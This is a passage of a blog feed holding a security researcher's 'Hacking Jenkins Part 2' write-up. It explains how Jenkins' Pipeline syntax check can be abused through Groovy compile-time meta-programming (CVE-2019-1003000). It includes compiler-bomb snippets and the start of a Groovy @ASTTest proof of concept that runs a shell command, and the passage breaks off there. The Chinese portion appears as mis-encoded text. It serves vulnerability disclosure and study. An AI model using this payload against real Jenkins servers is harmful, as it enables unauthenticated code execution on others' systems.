ÂÖ©ÂÄãÈÄ≤ÂÖ•ÈªûÂ§ñÔºåÂú®ÊºèÊ¥ûË¢´‰øÆÂæ©ÂæåÔºå&lt;a href=&quot;https://twitter.com/0ang3el&quot;&gt;Mikhail Egorov&lt;/a&gt; ‰πüÂæàÂø´ÁöÑÊâæÂà∞‰∫ÜÂè¶Â§ñ‰∏ÄÂÄã&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292&quot;&gt;ÈÄ≤ÂÖ•Èªû&lt;/a&gt;ÂéªËß∏ÁôºÈÄôÂÄãÊºèÊ¥û!&lt;/p&gt;

&lt;p&gt;Èô§Ê≠§‰πãÂ§ñÔºåÈÄôÂÄãÊºèÊ¥ûÊõ¥ÂèØ‰ª•ËàáÊàëÂâç‰∏ÄÁØá &lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1&lt;/a&gt; ÊâÄÁôºÁèæÁöÑÊºèÊ¥û‰∏≤Ëµ∑‰æÜÔºåÂéªÁπûÈÅé Overall/Read ÁöÑÈôêÂà∂ÊàêÁÇ∫‰∏ÄÂÄãÂêçÁ¨¶ÂÖ∂ÂØ¶‰∏çÁî®Ë™çË≠âÁöÑÈÅ†Á´Ø‰ª£Á¢ºÂü∑Ë°åÊºèÊ¥û!(Â¶ÇÊûú‰Ω†ÊúâÂ•ΩÂ•ΩÁöÑËÆÄÂÆåÈÄôÂÖ©ÁØáÊñáÁ´†ÔºåÊáâË©≤Â∞ç‰Ω†‰∏çÊòØÈõ£‰∫ãXD) Ëá≥ÊñºÊúâÊ≤íÊúâÊõ¥Â§öÁöÑÁé©Ê≥ï? Â∞±‰∫§Áµ¶Â§ßÂÆ∂Ëá™Áî±ÁôºÊèÆ‰∏≤Âá∫Ëá™Â∑±ÁöÑÊîªÊìäÈèàÂõâ!&lt;/p&gt;

&lt;p&gt;ÊÑüË¨ùÂ§ßÂÆ∂ÁöÑÈñ±ËÆÄÔºåHacking Jenkins Á≥ªÂàóÊñáÂ∞±Âú®ÈÄôË£°Â∑Æ‰∏çÂ§öÂÖàÂëä‰∏ÄÂÄãÊÆµËêΩÂõâ! Êú™‰æÜÂ∞áÊúÉÂÜçÁôºË°®Êõ¥Â§öÊúâË∂£ÁöÑÊäÄË°ìÁ†îÁ©∂Êï¨Ë´ãÊúüÂæÖ!&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/</link>
                <guid>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE</guid>
                <pubDate>Tue, 19 Feb 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN)</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hello everyone!&lt;/p&gt;

&lt;p&gt;This is the Hacking Jenkins series part two! For those people who still have not read the part one yet, you can check the following link to get some basis and see how vulnerable Jenkins‚Äô dynamic routing is!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1 - Play with Dynamic Routing
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As the previous article said, in order to utilize the vulnerability, we want to find a code execution can be chained with the ACL bypass vulnerability to a well-deserved pre-auth remote code execution! But, I failed. Due to the feature of dynamic routing, Jenkins checks the permission again before most dangerous invocations(Such as the &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;)! Although we could bypass the first ACL, we still can‚Äôt do much things :(&lt;/p&gt;

&lt;p&gt;After Jenkins released the &lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;Security Advisory&lt;/a&gt; and fixed the dynamic routing vulnerability on 2018-12-05, I started to organize my notes in order to write this Hacking Jenkins series. While reviewing notes, I found another exploitation way on a gadget that I failed to exploit before! Therefore, the part two is the story for that! This is also one of my favorite exploits and is really worth reading :)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;First, we start from the Jenkins Pipeline to explain &lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266&quot;&gt;CVE-2019-1003000&lt;/a&gt;! Generally the reason why people choose Jenkins is that Jenkins provides a powerful Pipeline feature, which makes writing scripts for software building, testing and delivering easier! You can imagine Pipeline is just a powerful language to manipulate the Jenkins(In fact, Pipeline is a DSL built with Groovy)&lt;/p&gt;

&lt;p&gt;In order to check whether the syntax of user-supplied scripts is correct or not, Jenkins provides an interface for developers! Just think about if you are the developer, how will you implement this syntax-error-checking function? You can just write an AST(Abstract Syntax Tree) parser by yourself, but it‚Äôs too tough. So the easiest way is to reuse existing function and library!&lt;/p&gt;

&lt;p&gt;As we mentioned before, Pipeline is just a DSL built with Groovy, so Pipeline must follow the Groovy syntax! If the Groovy parser can deal with the Pipeline script without errors, the syntax must be correct! The code fragments here shows how Jenkins validates the Pipeline:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;JSON&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;doCheckScriptCompile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@QueryParameter&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;CpsGroovyShell&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;forTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;withParent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;CompilationFailedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JSONArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fromObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toCheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;CheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SUCCESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;asJSON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Approval requirements are managed by regular stapler form validation (via doCheckScript)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here Jenkins validates the Pipeline with the method &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;GroovyClassLoader.parseClass(‚Ä¶)&lt;/a&gt;! It should be noted that this is just an AST parsing. Without running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute()&lt;/code&gt; method, any dangerous invocation won‚Äôt be executed! If you try to parse the following Groovy script, you get nothing :(&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
print java.lang.Runtime.getRuntime().exec(&quot;id&quot;)
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the view of developers, the Pipeline can control Jenkins, so it must be dangerous and requires a strict permission check before every Pipeline invocation! However, this is just a simple syntax validation so the permission check here is more less than usual! Without any &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute()&lt;/code&gt; method, it‚Äôs just an AST parser and must be safe! This is what I thought when the first time I saw this validation. However, while I was writing the technique blog, Meta-Programming flashed into my mind!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;what-is-meta-programming&quot;&gt;What is Meta-Programming&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Meta-Programming is a kind of programming concept! The idea of Meta-Programming is providing an abstract layer for programmers to consider the program in a different way, and makes the program more flexible and efficient! There is no clear definition of Meta-Programming. In general, both processing the program by itself and writing programs that operate on other programs(compiler, interpreter or preprocessor‚Ä¶) are Meta-Programming! The philosophy here is very profound and could even be a big subject on Programming Language!&lt;/p&gt;

&lt;p&gt;If it is still hard to understand, you can just regard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval(...)&lt;/code&gt; as another Meta-Programming, which lets you operate the program on the fly. Although it‚Äôs a little bit inaccurate, it‚Äôs still a good metaphor for understanding! In software engineering, there are also lots of techniques related to Meta-Programming. For example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;C Macro&lt;/li&gt;
  &lt;li&gt;C++ Template&lt;/li&gt;
  &lt;li&gt;Java Annotation&lt;/li&gt;
  &lt;li&gt;Ruby (Ruby is a Meta-Programming friendly language, even there are books for that)&lt;/li&gt;
  &lt;li&gt;DSL(Domain Specific Languages, such as &lt;a href=&quot;http://sinatrarb.com/&quot;&gt;Sinatra&lt;/a&gt; and &lt;a href=&quot;https://gradle.org/&quot;&gt;Gradle&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When we are talking about Meta-Programming, we classify it into &lt;strong&gt;(1)compile-time&lt;/strong&gt; and &lt;strong&gt;(2)run-time Meta-Programming&lt;/strong&gt; according to the scope. Today, we focus on the compile-time Meta-Programming!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. It‚Äôs hard to explain Meta-Programming in non-native language. If you are interested, here are some materials! &lt;a href=&quot;https://en.wikipedia.org/wiki/Metaprogramming&quot;&gt;Wiki&lt;/a&gt;, &lt;a href=&quot;https://stackoverflow.com/questions/2565572/metaprogramming-self-explanatory-code-tutorials-articles-books/2566561#2566561&quot;&gt;Ref1&lt;/a&gt;, &lt;a href=&quot;http://cs.lmu.edu/~ray/notes/metaprogramming/&quot;&gt;Ref2&lt;/a&gt;&lt;/em&gt;
&lt;em&gt;P.S. I am not a programming language master, if there is anything incorrect or inaccurate, please forgive me &amp;lt;(_ _)&amp;gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;how-to-exploit&quot;&gt;How to Exploit?&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;From the previous section we know Jenkins validates Pipeline by &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;parseClass(‚Ä¶)&lt;/a&gt; and learn that Meta-Programming can poke the parser during compile-time! Compiling(or parsing) is a hard work with lots of tough things and hidden features. So, the idea is, is there any side effect we can leverage?&lt;/p&gt;

&lt;p&gt;There are many simple cases which have proved Meta-Programming can make the program vulnerable, such as the macro expansion in C language:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define a 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
#define b a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a
#define c b,b,b,b,b,b,b,b,b,b,b,b,b,b,b,b
#define d c,c,c,c,c,c,c,c,c,c,c,c,c,c,c,c
#define e d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d
#define f e,e,e,e,e,e,e,e,e,e,e,e,e,e,e,e
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int128&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;or the compiler resource bomb(make a 16GB ELF by just 18 bytes):&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;or calculating the Fibonacci number by compiler&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;fib&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 55&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 6765&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 102334155&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the assembly language of compiled binary, we can make sure the result is calculated at compile-time, not run-time!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;g++ template.cpp &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; template
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; intel &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; template
...
00000000000005fa &amp;lt;main&amp;gt;:
 5fa:   55                      push   rbp
 5fb:   48 89 e5                mov    rbp,rsp
 5fe:   c7 45 f4 37 00 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xc],0x37
 605:   c7 45 f8 6d 1a 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8],0x1a6d
 60c:   c7 45 &lt;span class=&quot;nb&quot;&gt;fc &lt;/span&gt;cb 7e 19 06    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x4],0x6197ecb
 613:   b8 00 00 00 00          mov    eax,0x0
 618:   5d                      pop    rbp
 619:   c3                      ret
 61a:   66 0f 1f 44 00 00       nop    WORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rax+rax&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1+0x0]
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For more examples, you can refer to the article &lt;a href=&quot;https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb&quot;&gt;Build a Compiler Bomb&lt;/a&gt; on StackOverflow!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;first-attempt&quot;&gt;First Attempt&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;Back to our exploitation, Pipeline is just a DSL built with Groovy, and Groovy is also a Meta-Programming friendly language. We start reading the Groovy official &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Meta-Programming manual&lt;/a&gt; to find some exploitation ways. In the section 2.1.9, we found the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@groovy.transform.ASTTest&lt;/code&gt; annotation. Here is its description:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer ‚Äúexplore‚Äù the AST during compilation and &lt;strong&gt;perform assertions on the AST&lt;/strong&gt; rather than on the result of compilation. This means that this AST transformations gives access to the AST before the Bytecode is produced. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; can be placed on any annotable node and requires two parameters:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;What! &lt;strong&gt;perform assertions on the AST&lt;/strong&gt;? Isn‚Äôt that what we want? Let‚Äôs write a simple Proof-of-Concept in local environment first:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
@groovy.transform.ASTTest(value={
    assert java.lang.Runtime.getRuntime().exec(&quot;touch pwned&quot;)
})
def x
